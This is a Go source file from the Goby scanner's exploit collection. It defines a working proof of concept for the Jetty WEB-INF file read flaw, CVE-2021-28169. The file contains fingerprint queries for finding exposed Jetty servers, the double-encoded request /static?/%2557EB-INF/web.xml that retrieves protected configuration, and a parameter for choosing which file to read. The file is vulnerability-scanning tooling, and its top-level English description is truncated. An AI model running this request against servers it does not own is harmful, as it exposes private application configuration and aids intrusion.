package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jetty File Read (CVE-2021-28169)",
    "Description": "For Eclipse Jetty versions ",
    "Impact": "Jetty File Read (CVE-2021-28169)",
    "Recommendation": "<p>upgrade</p>",
    "Product": "Jetty",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Eclipse Jetty WEB-INF 目录敏感信息泄露漏洞（CVE-2021-28169）",
            "Description": "<p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p><p>对于 Eclipse Jetty 小于等于9.4.40、小于等于10.0.2、小于等于11.0.2的版本，攻击者可以使用双重编码路径对 ConcatServlet 的请求访问 WEB-INF 目录中的敏感信息。</p>",
            "Impact": "<p>对于 Eclipse Jetty 小于等于9.4.40、小于等于10.0.2、小于等于11.0.2的版本，攻击者可以使用双重编码路径对 ConcatServlet 的请求访问 WEB-INF 目录中的敏感信息。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq\" target=\"_blank\">https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq</a><br></p>",
            "Product": "Jetty",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Jetty File Read (CVE-2021-28169)",
            "Description": "For Eclipse Jetty versions <= 9.4.40, <= 10.0.2, <= 11.0.2, it is possible for requests to the ConcatServlet with a doubly encoded path to access protected resources within the WEB-INF directory. For example a request to /concat?/%2557EB-INF/web.xml can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.",
            "Impact": "Jetty File Read (CVE-2021-28169)",
            "Recommendation": "<p>upgrade</p>",
            "Product": "Jetty",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "((header=\"Server: Jetty\" && header!=\"couchdb\" && header!=\"drupal\") || (banner=\"Server: Jetty\" && banner!=\"couchdb\" && banner!=\"drupal\"))",
    "GobyQuery": "((header=\"Server: Jetty\" && header!=\"couchdb\" && header!=\"drupal\") || (banner=\"Server: Jetty\" && banner!=\"couchdb\" && banner!=\"drupal\"))",
    "Author": "yanwu",
    "Homepage": "https://www.eclipse.org/jetty/",
    "DisclosureDate": "2021-06-11",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28169"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [
        "CVE-2021-28169"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202106-724"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/static?/%2557EB-INF/web.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<web-app>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<display-name>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Archetype Created Web Application",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/static?/%2557EB-INF/web.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<web-app>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<display-name>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Archetype Created Web Application",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "%2557EB-INF/web.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
